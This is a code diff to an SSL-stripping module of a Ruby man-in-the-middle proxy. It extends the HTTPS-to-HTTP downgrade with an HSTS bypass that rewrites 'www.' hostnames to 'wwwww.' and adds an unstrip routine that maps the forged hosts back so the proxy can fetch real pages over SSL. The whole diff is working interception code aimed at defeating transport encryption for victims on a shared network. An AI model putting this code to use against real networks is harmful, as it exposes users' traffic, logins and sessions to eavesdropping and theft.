@@ -42,7 +42,17 @@ class StrippedObject
   # Downgrade +url+ from HTTPS to HTTP.
   # Will take care of HSTS bypass urls in a near future.
   def self.strip( url )
-    url.gsub( 'https://', 'http://' )
+    stripped = url.gsub( 'https://', 'http://' )
+
+    if stripped.include?('www.')
+      stripped = stripped.gsub( 'www.', 'wwwww.' )
+    else
+      stripped = stripped.gsub( '://', '://wwwww.' )
+    end
+
+    Logger.debug  "[#{'SSLSTRIP'.green} '#{url}' -> '#{stripped}'"
+
+    stripped
   end
 
 end
@@ -63,13 +73,22 @@ class Strip
 
   # Return true if the +request+ was stripped.
   def was_stripped?(request)
-    url = request.to_url(nil)
+    url = request.base_url
     @stripped.each do |s|
       if s.client == request.client and s.stripped == url
         return true
       end
     end
     false
+  end
+
+  def unstrip( request, url )
+    @stripped.each do |s|
+      if s.client == request.client and s.stripped == url
+        return s.original
+      end
+    end
+    url
   end
 
   # Check if the +request+ is a result of a stripped link/redirect and handle
@@ -130,8 +149,13 @@ class Strip
   # proxy it via SSL.
   def process_stripped!(request)
     if request.port == 80 and was_stripped?(request)
-      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{request.to_url}', proxying via SSL."
-      request.port = 443
+      url        = StrippedObject.normalize( request['Host'], 'http' )
+      unstripped = unstrip( request, url ).gsub( 'https://', '' ).gsub('/', '' )
+
+      request['Host'] = unstripped
+      request.port    = 443
+
+      Logger.debug "[#{'SSLSTRIP'.green} #{request.client}] Found stripped HTTPS link '#{url}', proxying via SSL ( #{request.to_url} )."
     end
   end
 
